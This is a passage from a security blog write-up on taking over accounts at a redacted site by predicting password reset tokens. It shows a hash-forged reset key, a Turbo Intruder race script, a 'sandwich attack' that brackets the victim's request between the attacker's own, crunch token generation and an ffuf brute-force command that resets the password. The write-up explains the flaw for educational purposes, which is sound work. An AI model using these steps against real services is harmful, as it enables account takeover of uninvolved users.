<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>v1/forgotpassword : ForgotPassword.js = v1/password/reset : X
</pre></td></tr></tbody></table></code></div></div>
<p>then X should be something like <code class="language-plaintext highlighter-rouge">ResetPassword.js</code>, right?</p>

<p>Right, and we can see that <code class="language-plaintext highlighter-rouge">dataSizeKey</code> is calculated in a similar way as before:</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">uid</span> <span class="o">=</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">frgtPwdGetQuestionResponse</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">uid</span><span class="p">)</span> <span class="p">?</span> <span class="nx">res</span><span class="p">.</span><span class="nx">frgtPwdGetQuestionResponse</span><span class="p">.</span><span class="nx">data</span><span class="p">.</span><span class="nx">uid</span> <span class="p">:</span> <span class="dl">''</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">reqstData</span> <span class="o">=</span> <span class="p">{</span>
<span class="dl">"</span><span class="s2">rstPasswordRequest</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">requestData</span><span class="dl">"</span><span class="p">:{</span>
    <span class="dl">"</span><span class="s2">clientAppId</span><span class="dl">"</span><span class="p">:</span> <span class="nx">FG</span><span class="p">.</span><span class="nx">clientAppId</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">country</span><span class="dl">"</span><span class="p">:</span> <span class="nx">FG</span><span class="p">.</span><span class="nx">country</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">language</span><span class="dl">"</span><span class="p">:</span> <span class="nx">FG</span><span class="p">.</span><span class="nx">language</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">uid</span><span class="dl">"</span><span class="p">:</span> <span class="nx">uid</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">newPassword</span><span class="dl">"</span><span class="p">:</span> <span class="nx">formData</span><span class="p">[</span><span class="dl">'</span><span class="s1">confpassword</span><span class="dl">'</span><span class="p">]</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="p">};</span>
<span class="nx">reqstData</span><span class="p">.</span><span class="nx">rstPasswordRequest</span><span class="p">.</span><span class="nx">requestData</span><span class="p">[</span><span class="dl">"</span><span class="s2">dataSizeKey</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="nf">formvault</span><span class="p">(</span>
    <span class="nx">FG</span><span class="p">.</span><span class="nx">clientAppId</span> <span class="o">+</span> <span class="nx">uid</span> <span class="o">+</span> <span class="nx">formData</span><span class="p">[</span><span class="dl">'</span><span class="s1">confpassword</span><span class="dl">'</span><span class="p">]</span>
    <span class="c1">// sha256("FLTUSEN"+"FLTUSENE2407040512811107W"+"Pwn3dAcc")</span>
    <span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">uid</code> is the field we obtain as a result of the request to <code class="language-plaintext highlighter-rouge">v1/forgotpassword</code>, and the other fields are all known or user-controlled values.</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'FLTUSENFLTUSENE2407040512811107WPwn3dAcc'</span> | <span class="nb">sha256sum 
</span>6c41c41706afbd392d521cee7fbdf805225fc55542f7a6db1ae98be01059c3a1
</pre></td></tr></tbody></table></code></div></div>

<p>This means that having a valid userâ€™s e-mail address is enough to reset his password.</p>

<p><a href="/assets/img/custom-password-reset-tokens/1.png" class="popup img-link shimmer"><img src="/assets/img/custom-password-reset-tokens/1.png" alt="" loading="lazy"></a>
<em>leaked user uid and reset its password</em></p>

<p><a href="/assets/img/custom-password-reset-tokens/2.png" class="popup img-link shimmer"><img src="/assets/img/custom-password-reset-tokens/2.png" alt="" loading="lazy"></a>
<em>logged in on behalf of the user</em></p>

<h1 id="calculate-and-brute-force-weak-tokens-with-the-sandwich-attack">Calculate and brute-force weak tokens with the Sandwich Attack</h1>

<h2 id="the-hot-fix-to-the-previous-flaw"><span class="me-2">The hot-fix to the previous flaw</span><a href="#the-hot-fix-to-the-previous-flaw" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Following the first flaw, it was suggested to the development team to modify the password reset mechanism, remove the information returned in server responses, and introduce random tokens generated with cryptographically safe algorithm.</p>

<p>However, they chose to take the easy route by removing the <code class="language-plaintext highlighter-rouge">uid</code> from the <code class="language-plaintext highlighter-rouge">/forgotpassword</code> server response, eliminating the <code class="language-plaintext highlighter-rouge">dataSizeKey</code> field from the entire forgot password mechanism, and replacing the <code class="language-plaintext highlighter-rouge">uid</code> field with <code class="language-plaintext highlighter-rouge">token</code> in <code class="language-plaintext highlighter-rouge">/password/reset</code> without switching to a more robust and random token.</p>

<p><a href="/assets/img/custom-password-reset-tokens/forgotpassword-diff.png" class="popup img-link shimmer"><img src="/assets/img/custom-password-reset-tokens/forgotpassword-diff.png" alt="" loading="lazy"></a>
<em>forgotpassword request and response comparison</em></p>

<p><a href="/assets/img/custom-password-reset-tokens/resetpassword-diff.png" class="popup img-link shimmer"><img src="/assets/img/custom-password-reset-tokens/resetpassword-diff.png" alt="" loading="lazy"></a>
<em>password/reset request comparison</em></p>

<p>In doing so, it is no longer possible to reset a userâ€™s password at will via the <code class="language-plaintext highlighter-rouge">/password/reset</code> API because you must first find a way to leak the necessary password reset <code class="language-plaintext highlighter-rouge">token</code>.</p>

<h2 id="token-analysis"><span class="me-2">Token analysis</span><a href="#token-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>By generating several forgot password emails spread and grouped over several days and times, and analysing the subsequent tokens, we can identify some interesting <em>common patterns</em>.</p>

<pre><code class="language-txt">/reset-password.php?token=FLTUSENh11R22508
/reset-password.php?token=FLTUSENe11H52508
/reset-password.php?token=FLTUSENj11g42508
/reset-password.php?token=FLTUSENz11X01408
/reset-password.php?token=FLTUSENU11N21611
/reset-password.php?token=FLTUSENw11n62910
/reset-password.php?token=FLTUSENL11T53909
</code></pre>

<p>Tokens are generated following this schema:</p>

<pre><code class="language-txt">FLTUSEN (undefined letter) (month number) (undefined letter) (undefined number) (minutes) (seconds)
FLTUSEN          h               11                 R                 2             25       08
FLTUSEN          e               11                 H                 5             25       08
FLTUSEN          j               11                 g                 4             25       08
FLTUSEN          z               11                 X                 0             14       08
FLTUSEN          U               11                 N                 2             16       11
FLTUSEN          w               11                 n                 6             29       10
FLTUSEN          L               11                 T                 5             39       09
</code></pre>

<p>Since tokens are generated with precision <em>down to the second</em> (which is quite relaxed), and we can predict most of the tokenâ€™s components, there are <em>approximately 27.040 combinations</em> for a single second. This results from having to guess two letters (with unknown case) and one digit (52 Ã— 52 Ã— 10).</p>

<p>Fortunately for us, the server is poorly configured and does not distinguish between upper and lower case letters, thus allowing us to reduce the number of possibilities to 6.760 (26 Ã— 26 Ã— 10).</p>

<p><a href="/assets/img/custom-password-reset-tokens/token-case.png" class="popup img-link shimmer"><img src="/assets/img/custom-password-reset-tokens/token-case.png" alt="" loading="lazy"></a>
<em>Second token with inverted upper and lower case random letters is still accepted</em></p>

<h2 id="reducing-the-time-window-single-packet-attack"><span class="me-2">Reducing the time window (single-packet attack)</span><a href="#reducing-the-time-window-single-packet-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Having reached this point, the last thing to do is to work out in which exact second the request is processed by the server. Time-based attacks are, obviously, very time-sensitive, so we have to find a way to pinpoint the exact moment when the server calculates the token <sup id="fnref:time-sensitive-attacks"><a href="#fn:time-sensitive-attacks" class="footnote" rel="footnote" role="doc-noteref">3</a></sup>.</p>

<p>The application server supports HTTP/2, so we can use the single-packet attack <sup id="fnref:single-packet-attack:1"><a href="#fn:single-packet-attack" class="footnote" rel="footnote" role="doc-noteref">1</a></sup> to send two or more requests down the same HTTP connection, obtaining zero latency between them.</p>

<p>My initial assumption was that by sending two requests at the <em>exact</em> same time, one with the attackerâ€™s email and one with the victimâ€™s email, the server would process them at the same time and thus assign the <em>same exact</em> token to both requests.</p>

<pre><code class="language-mermaid">sequenceDiagram
    autonumber
    par h17:39:09
        Client-&gt;&gt;+Server: attacker@email.com
        Note over Server: Token is FLTUSENL11T53909
        Client-&gt;&gt;Server: victim@email.com
        Note over Server: Token is FLTUSENL11T53909
    end
        create participant attacker@email.com
        Server--&gt;&gt;attacker@email.com: /reset.html?token=FLTUSENL11T53909
        destroy attacker@email.com
        create participant victim@email.com
        Server--&gt;&gt;-victim@email.com: /reset.html?token=FLTUSENL11T53909
        destroy victim@email.com
</code></pre>

<p>I set up Turbo Intruder <sup id="fnref:turbo-intruder"><a href="#fn:turbo-intruder" class="footnote" rel="footnote" role="doc-noteref">4</a></sup> to send 5 HTTP requests within the same connection using the script below and ran the scan:</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre></td><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">queueRequests</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">wordlists</span><span class="p">):</span>

    <span class="c1"># if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
</span>    <span class="c1"># if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
</span>    <span class="c1"># for more information, check out https://portswigger.net/research/smashing-the-state-machine
</span>    <span class="n">engine</span> <span class="o">=</span> <span class="nc">RequestEngine</span><span class="p">(</span><span class="n">endpoint</span><span class="o">=</span><span class="n">target</span><span class="p">.</span><span class="n">endpoint</span><span class="p">,</span>
                           <span class="n">concurrentConnections</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span>
                           <span class="n">engine</span><span class="o">=</span><span class="n">Engine</span><span class="p">.</span><span class="n">BURP2</span>
                           <span class="p">)</span>

    <span class="c1"># the 'gate' argument withholds part of each request until openGate is invoked
</span>    <span class="c1"># if you see a negative timestamp, the server responded before the request was complete
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
        <span class="n">engine</span><span class="p">.</span><span class="nf">queue</span><span class="p">(</span><span class="n">target</span><span class="p">.</span><span class="n">req</span><span class="p">,</span> <span class="n">gate</span><span class="o">=</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>

    <span class="c1"># once every 'race1' tagged request has been queued
</span>    <span class="c1"># invoke engine.openGate() to send them in sync
</span>    <span class="n">engine</span><span class="p">.</span><span class="nf">openGate</span><span class="p">(</span><span class="sh">'</span><span class="s">race1</span><span class="sh">'</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">handleResponse</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">interesting</span><span class="p">):</span>
    <span class="n">table</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/custom-password-reset-tokens/turbointruder-2.png" class="popup img-link shimmer"><img src="/assets/img/custom-password-reset-tokens/turbointruder-2.png" alt="" loading="lazy"></a>
<em>Sent 5 forgot password requests down the same HTTP/2 connection concurrently</em></p>

<p>Unfortunately, the results were different from what was expected:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>?token=FLTUSEN P 12 Y 1 4709
?token=FLTUSEN g 12 J 7 4709
?token=FLTUSEN V 12 v 7 4709
?token=FLTUSEN e 12 p 3 4709
?token=FLTUSEN B 12 A 8 4709
</pre></td></tr></tbody></table></code></div></div>

<p>Although all the requests arrived at the server simultaneously, the tokens generated were different. This suggests that the server likely does not support parallel token generation and multi-threading, but processes them sequentially, one at a time. This prevents us from determining the victimâ€™s exact token but not from predicting the approximate moment it is generated.</p>

<h2 id="sandwich-attack"><span class="me-2">Sandwich Attack</span><a href="#sandwich-attack" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>If we send a request targeting the victimâ€™s email between two requests targeting an email under our control, we can use the tokens assigned to the latter as a reference to infer the one assigned to the victim <sup id="fnref:sandwich-attack:1"><a href="#fn:sandwich-attack" class="footnote" rel="footnote" role="doc-noteref">2</a></sup>.</p>

<pre><code class="language-mermaid">sequenceDiagram
    autonumber
    par h13:03:10
        Client-&gt;&gt;Server: attacker@email.com
        Client-&gt;&gt;Server: victim@email.com
        Client-&gt;&gt;Server: attacker@email.com
    end
        Note over Server: attacker token is FLTUSENa11u70310
        create participant attacker@email.com
        Server--&gt;&gt;attacker@email.com: /reset.html?token=FLTUSENa11u70310
        Note over Server: victim token token is ???
        create participant victim@email.com
        Server--&gt;&gt;victim@email.com: /reset.html?token=???
        Note over Server: attacker token is FLTUSENC11I10310
        Server--&gt;&gt;attacker@email.com: /reset.html?token=FLTUSENC11I10310
        destroy attacker@email.com
        destroy victim@email.com
</code></pre>

<p>Token results:</p>
<div class="language-text highlighter-rouge"><div class="code-header">
        <span data-label-text="Text"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>FLTUSEN a 11 u 7 0310 (attack)
FLTUSEN ? 11 ? ? 0310 (victim)
FLTUSEN C 11 I 1 0310 (attack)
</pre></td></tr></tbody></table></code></div></div>

<p>Using the two tokens we obtained as a template, we can generate all possible missing combinations using crunch <sup id="fnref:crunch"><a href="#fn:crunch" class="footnote" rel="footnote" role="doc-noteref">5</a></sup> or a Python script:</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>crunch 16 16 <span class="nt">-t</span> FLTUSEN,11,%0310 <span class="nt">-o</span> tokens.txt
Crunch will now generate the following amount of data: 114920 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 6760 
FLTUSENA11A00310
FLTUSENA11A10310
FLTUSENA11A20310
FLTUSENA11A30310
FLTUSENA11A40310
FLTUSENA11A50310
FLTUSENA11A60310
FLTUSENA11A70310
FLTUSENA11A80310
FLTUSENA11A90310
...
</pre></td></tr></tbody></table></code></div></div>

<p>After generating every possible combinations, we can brute-force the <code class="language-plaintext highlighter-rouge">/password/reset</code> API to identify the userâ€™s token and reset the password:</p>

<div class="language-sh highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>ffuf <span class="nt">-u</span> <span class="s2">"https://www.redacted.com/host/service/password/reset"</span> <span class="nt">-X</span> POST <span class="se">\</span>
<span class="nt">-H</span> <span class="s2">"Content-Type: application/json"</span> <span class="se">\</span>
<span class="nt">-d</span> <span class="s2">"{</span><span class="se">\"</span><span class="s2">rstPasswordRequest</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">requestData</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">clientAppId</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">FLTUSEN</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">country</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">US</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">language</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">EN</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">token</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">FUZZ</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">newPassword</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Pwn3dAccount!</span><span class="se">\"</span><span class="s2">}}}"</span> <span class="se">\</span>
<span class="nt">-w</span> tokens.txt <span class="se">\</span>
<span class="nt">-fs</span> 81
...
FLTUSENE11L10310        <span class="o">[</span>Status: 200, Size: 41, Words: 7, Lines: 1, Duration: 547ms]
...
</pre></td></tr></tbody></table></code></div></div>

<p>Depending on the number of attempts made, it could be that the server momentarily blocks the IP performing the bruteforce. If this occurs, it becomes difficult to make the attack reliable because some WAF or protection mechanism may block the attacker before he sends all 6760 combinations.</p>

<p>In this case, increasing the probability of a successful attack is as simple as generating more tokens within the same second the codes are created. Generating more tokens within the 6,760 combination range increases the chances of finding a match, reducing the likelihood of being blocked prematurely.</p>

<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:single-packet-attack">
      <p><a href="https://portswigger.net/research/the-single-packet-attack-making-remote-race-conditions-local">The single-packet attack</a>, portswigger.netÂ <a href="#fnref:single-packet-attack" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a>Â <a href="#fnref:single-packet-attack:1" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;<sup>2</sup></a></p>
    </li>
    <li id="fn:sandwich-attack">
      <p><a href="https://appsec-labs.com/sandwich-attacks/">Sandwich Attacks: From Reset Password to Account Takeover</a>, appsec-labs.comÂ <a href="#fnref:sandwich-attack" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a>Â <a href="#fnref:sandwich-attack:1" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;<sup>2</sup></a></p>
    </li>
    <li id="fn:time-sensitive-attacks">
      <p><a href="https://portswigger.net/web-security/race-conditions#time-sensitive-attacks">Time-sensitive attacks</a>, portswigger.netÂ <a href="#fnref:time-sensitive-attacks" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:turbo-intruder">
      <p><a href="https://portswigger.net/bappstore/9abaa233088242e8be252cd4ff534988">Turbo Intruder</a>, portswigger.netÂ <a href="#fnref:turbo-intruder" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:crunch">
      <p><a href="https://manpages.ubuntu.com/manpages/focal/man1/crunch.1.html"><code class="language-plaintext highlighter-rouge">crunch</code> - generate wordlists from a character set</a>, manpages.ubuntu.comÂ <a href="#fnref:crunch" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
  </ol>
</div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/articles-writeups/">Articles & Writeups</a>,
          <a href="/categories/web-hacking/">Web Hacking</a>
      </div>
    

    <!-- tags -->
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Defeating%20custom%20password%20reset%20tokens%20-%200xbro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhacking-custom-reset-password-tokens%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Defeating%20custom%20password%20reset%20tokens%20-%200xbro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhacking-custom-reset-password-tokens%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhacking-custom-reset-password-tokens%2F&text=Defeating%20custom%20password%20reset%20tokens%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

      

      <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhacking-custom-reset-password-tokens%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

      

      <a href="https://www.reddit.com/submit?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fhacking-custom-reset-password-tokens%2F&title=Defeating%20custom%20password%20reset%20tokens%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit">
        <i class="fa-fw fa-brands fa-square-reddit"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/how-i-keep-updated/">How I keep updated in the infosec industry</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/">Vtenext 25.02 vulnerability research</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/wp-prevent-direct-access-CVE-2025-3861/">Incorrect Authorization to Authenticated (Contributor+) Multiple Media Actions in Prevent Direct Access Wordpress Plugin (CVE-2025-3861)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/effective-notes-with-obsidian/">Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/salesforce-hacking/">Pentesting Salesforce Communities</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











